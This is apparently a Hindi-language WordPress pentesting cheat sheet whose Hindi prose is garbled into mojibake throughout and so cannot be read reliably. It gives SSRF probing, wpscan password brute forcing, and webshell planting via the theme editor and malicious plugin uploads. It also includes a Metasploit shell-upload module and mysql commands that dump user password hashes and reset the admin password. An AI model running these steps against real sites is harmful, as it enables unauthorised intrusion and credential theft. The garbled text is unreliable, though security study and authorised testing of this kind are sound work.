рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, `wp-cron.php` рд╣рд░ рдкреГрд╖реНрда рд▓реЛрдб рдкрд░ (рдЬрдм рднреА рдХреЛрдИ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛрдИ Wordpress рдкреГрд╖реНрда рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ) рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЙрдЪреНрдЪ-рдЯреНрд░реИрдлрд╝рд┐рдХ рд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рд╕рдорд╕реНрдпрд╛рдПрдБ рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (DoS)ред

Wp-Cron рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХреНрд░реЛрдирдЬреЙрдм рдмрдирд╛рдирд╛ рдЬреЛ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рдЖрд╡рд╢реНрдпрдХ рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░рддрд╛ рд╣реИ (рдмрд┐рдирд╛ рд╕рдорд╕реНрдпрд╛рдПрдБ рдкреИрджрд╛ рдХрд┐рдП) рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ рдкрд░ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдФрд░ Worpress рд╕рд╛рдЗрдЯ рдЖрдкрд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреА рд╣реИред

рдЬрдм рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рддреЛ рдпрд╣ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реИ:

![](<../../images/image (365).png>)

## SSRF

{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

рдпрд╣ рдЙрдкрдХрд░рдг рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ **methodName: pingback.ping** рдФрд░ рдкрде **/wp-json/oembed/1.0/proxy** рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдФрд░ рдпрджрд┐ рдпрд╣ рдореМрдЬреВрдж рд╣реИ, рддреЛ рдпрд╣ рдЙрдиреНрд╣реЗрдВ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Get access by overwriting a bit

рдпрд╣ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╣рдорд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдПрдХ рдЬрд┐рдЬреНрдЮрд╛рд╕рд╛ рд╣реИред IN the CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) рдЖрдк рдХрд┐рд╕реА рднреА wordpress рдлрд╝рд╛рдЗрд▓ рд╕реЗ 1 рдмрд┐рдЯ рдХреЛ рдкрд▓рдЯ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рдЖрдк рдлрд╝рд╛рдЗрд▓ `/var/www/html/wp-includes/user.php` рдХреЗ рд╕реНрдерд┐рддрд┐ `5389` рдХреЛ NOP NOT (`!`) рдСрдкрд░реЗрд╢рди рдХреЗ рд▓рд┐рдП рдкрд▓рдЯ рд╕рдХрддреЗ рд╣реИрдВред
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **рдкреИрдирд▓ RCE**

**рдереАрдо рд╕реЗ рдПрдХ php рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ (рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛)**

рджреГрд╢реНрдп тЖТ рдереАрдо рд╕рдВрдкрд╛рджрдХ тЖТ 404 рдЯреЗрдореНрдкрд▓реЗрдЯ (рджрд╛рдИрдВ рдУрд░)

рдПрдХ php рд╢реЗрд▓ рдХреЗ рд▓рд┐рдП рд╕рд╛рдордЧреНрд░реА рдмрджрд▓реЗрдВ:

![](<../../images/image (384).png>)

рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЦреЛрдЬреЗрдВ рдХрд┐ рдЖрдк рдЙрд╕ рдЕрдкрдбреЗрдЯреЗрдб рдкреГрд╖реНрда рддрдХ рдХреИрд╕реЗ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдкрдХреЛ рдпрд╣рд╛рдБ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ .php рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдПрдХ рдкреНрд▓рдЧрдЗрди рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдкрдиреЗ php рдмреИрдХрдбреЛрд░ рдХреЛ рдмрдирд╛рдПрдВ:

![](<../../images/image (183).png>)

рдлрд┐рд░ рдПрдХ рдирдпрд╛ рдкреНрд▓рдЧрдЗрди рдЬреЛрдбрд╝реЗрдВ:

![](<../../images/image (722).png>)

рдкреНрд▓рдЧрдЗрди рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ Install Now рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](<../../images/image (249).png>)

Proceed рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](<../../images/image (70).png>)

рд╕рдВрднрд╡рддрдГ рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдХреБрдЫ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк Media рдкрд░ рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рдЖрдкрдХрд╛ рд╢реЗрд▓ рдЕрдкрд▓реЛрдб рд╣реЛ рдЧрдпрд╛ рд╣реИ:

![](<../../images/image (462).png>)

рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрдк рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП URL рджреЗрдЦреЗрдВрдЧреЗ:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

рдпрд╣ рд╡рд┐рдзрд┐ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреНрд▓рдЧрдЗрди рдХреЗ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ рдЬрд┐рд╕реЗ рдХрдордЬреЛрд░ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ WordPress рдбреИрд╢рдмреЛрд░реНрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдЬрд╛рддреА рд╣реИ:

1. **Plugin Acquisition**: рдкреНрд▓рдЧрдЗрди рдХреЛ Exploit DB рдЬреИрд╕реЗ рд╕реНрд░реЛрдд рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреИрд╕реЗ [**рдпрд╣рд╛рдВ**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress рдбреИрд╢рдмреЛрд░реНрдб рдкрд░ рдЬрд╛рдПрдВ, рдлрд┐рд░ `Dashboard > Plugins > Upload Plugin` рдкрд░ рдЬрд╛рдПрдВред
- рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рдкреНрд▓рдЧрдЗрди рдХреА рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
3. **Plugin Activation**: рдПрдХ рдмрд╛рд░ рдкреНрд▓рдЧрдЗрди рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЗрд╕реЗ рдбреИрд╢рдмреЛрд░реНрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
4. **Exploitation**:
- "reflex-gallery" рдкреНрд▓рдЧрдЗрди рд╕реНрдерд╛рдкрд┐рдд рдФрд░ рд╕рдХреНрд░рд┐рдп рд╣реЛрдиреЗ рдкрд░, рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХрдордЬреЛрд░ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред
- Metasploit рдврд╛рдВрдЪрд╛ рдЗрд╕ рдХрдордЬреЛрд░реА рдХреЗ рд▓рд┐рдП рдПрдХ рд╢реЛрд╖рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЙрдкрдпреБрдХреНрдд рдореЙрдбреНрдпреВрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ, рдПрдХ рдореАрдЯрд░рдкреНрд░реАрдЯрд░ рд╕рддреНрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рдЗрдЯ рдкрд░ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
- рдпрд╣ рдиреЛрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдпрд╣ WordPress рд╕рд╛рдЗрдЯ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред

рд╕рд╛рдордЧреНрд░реА рдореЗрдВ рдкреНрд▓рдЧрдЗрди рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдФрд░ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП WordPress рдбреИрд╢рдмреЛрд░реНрдб рдореЗрдВ рдЪрд░рдгреЛрдВ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓реЗ рджреГрд╢реНрдп рд╕рд╣рд╛рдпрддрд╛ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рдмрд┐рдирд╛ рдЙрдЪрд┐рдд рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рдЕрд╡реИрдз рдФрд░ рдЕрдиреИрддрд┐рдХ рд╣реИред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╕реЗ рдФрд░ рдХреЗрд╡рд▓ рдХрд╛рдиреВрдиреА рд╕рдВрджрд░реНрдн рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ рдХрд┐ рд╕реНрдкрд╖реНрдЯ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдкреЗрдирдЯреЗрд╕реНрдЯрд┐рдВрдЧред

**рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬрд┐рд╕реЗ **Cross-Site Scripting (XSS)** рдХрдордЬреЛрд░реА рдХреЛ **Remote Code Execution (RCE)** рдпрд╛ рдЕрдиреНрдп рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдореЗрдВ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдпрд╣ **Wordpress Versions 6.X.X, 5.X.X рдФрд░ 4.X.X рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:**
- _**Privilege Escalation:**_ WordPress рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддрд╛ рд╣реИред
- _**(RCE) Custom Plugin (backdoor) Upload:**_ рдЕрдкрдиреЗ рдХрд╕реНрдЯрдо рдкреНрд▓рдЧрдЗрди (рдмреИрдХрдбреЛрд░) рдХреЛ WordPress рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
- _**(RCE) Built-In Plugin Edit:**_ WordPress рдореЗрдВ рдПрдХ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкреНрд▓рдЧрдЗрди рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░реЗрдВред
- _**(RCE) Built-In Theme Edit:**_ WordPress рдореЗрдВ рдПрдХ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдереАрдо рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░реЗрдВред
- _**(Custom) Custom Exploits:**_ рддреГрддреАрдп-рдкрдХреНрд╖ WordPress рдкреНрд▓рдЧрдЗрдиреНрд╕/рдереАрдо рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рд╢реЛрд╖рдгред

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
рдПрдбрдорд┐рди рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

рдПрдХ Wordpress рдкреНрд▓рдЧрдЗрди рдХреИрд╕реЗ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдЬрд╛рдирдирд╛ рдЗрд╕рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдореЗрдВ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдВрдЬреА рд╣реИред рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдмреБрд▓реЗрдЯ рдкреЙрдЗрдВрдЯреНрд╕ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдкреНрд▓рдЧрдЗрди рдХреИрд╕реЗ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ [**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://nowotarski.info/wordpress-nonce-authorization/) рдореЗрдВ рдХреБрдЫ рдХрдордЬреЛрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЗ рдЙрджрд╛рд╣рд░рдгред

- **`wp_ajax`**

рдПрдХ рдкреНрд▓рдЧрдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ AJAX рд╣реИрдВрдбрд▓рд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИред рдЗрдирдореЗрдВ рд▓реЙрдЬрд┐рдХ, рдкреНрд░рд╛рдзрд┐рдХрд░рдг, рдпрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрдЧ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдЕрдХреНрд╕рд░ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдпреЗ рдХрд╛рд░реНрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рджреЛрдиреЛрдВ рдХреЛ рдПрдХ Wordpress nonce рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗ Wordpress рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ** (рдЗрд╕рдХреЗ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕реНрд╡рддрдВрддреНрд░)ред 

рдпреЗ рд╡реЗ рдХрд╛рд░реНрдп рд╣реИрдВ рдЬреЛ рдПрдХ рдкреНрд▓рдЧрдЗрди рдореЗрдВ рдПрдХ рдХрд╛рд░реНрдп рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдирдзрд┐рдХреГрдд рд▓реЛрдЧреЛрдВ) рджреНрд╡рд╛рд░рд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рд╕реБрд▓рдн рдмрдирд╛рддрд╛ рд╣реИред**

> [!CAUTION]
> рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ `wp_verify_nonce` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде, рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ рдпрд╣ рдЬрд╛рдВрдЪ рд░рд╣рд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реИ, рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдХрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

- **REST API**

рдпрд╣ `register_rest_route` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд░реНрдбрдкреНрд░реЗрд╕ рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдХреЙрд▓рдмреИрдХ рд╣реИ рдЬреЛ рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ API рд╡рд┐рдзрд┐ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рд╣реИред

**рдпрджрд┐ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд `__return_true` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдмрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХреЛ рдЫреЛрдбрд╝ рджреЗрдЧрд╛ред**

- **php рдлрд╝рд╛рдЗрд▓ рддрдХ рд╕реАрдзреА рдкрд╣реБрдБрдЪ**

рдмреЗрд╢рдХ, Wordpress PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реАрдзреЗ рд╡реЗрдм рд╕реЗ рд╕реБрд▓рдн рд╣реЛрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХреЛрдИ рдкреНрд▓рдЧрдЗрди рдХрд┐рд╕реА рдХрдордЬреЛрд░ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдкрд░ рд╕рдХреНрд░рд┐рдп рд╣реЛрддреА рд╣реИ, рддреЛ рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### wp_ajax_nopriv рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдордирдорд╛рдирд╛ рдлрд╝рд╛рдЗрд▓ рд╣рдЯрд╛рдирд╛ (Litho рдереАрдо <= 3.0)

WordPress рдереАрдо рдФрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдЕрдХреНрд╕рд░ `wp_ajax_` рдФрд░ `wp_ajax_nopriv_` рд╣реБрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ AJAX рд╣реИрдВрдбрд▓рд░ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред рдЬрдм **_nopriv_** рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рддреЛ рдХреЙрд▓рдмреИрдХ рдЕрдирдзрд┐рдХреГрдд рдЖрдЧрдВрддреБрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХрд┐рд╕реА рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рд░реВрдк рд╕реЗ рд▓рд╛рдЧреВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:

1. рдПрдХ **рдХреНрд╖рдорддрд╛ рдЬрд╛рдВрдЪ** (рдЬреИрд╕реЗ `current_user_can()` рдпрд╛ рдХрдо рд╕реЗ рдХрдо `is_user_logged_in()`), рдФрд░
2. рдПрдХ **CSRF nonce** рдЬреЛ `check_ajax_referer()` / `wp_verify_nonce()` рдХреЗ рд╕рд╛рде рдорд╛рдиреНрдп рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдФрд░
3. **рдХрдареЛрд░ рдЗрдирдкреБрдЯ рд╕рдлрд╛рдИ / рдорд╛рдиреНрдпрддрд╛**ред

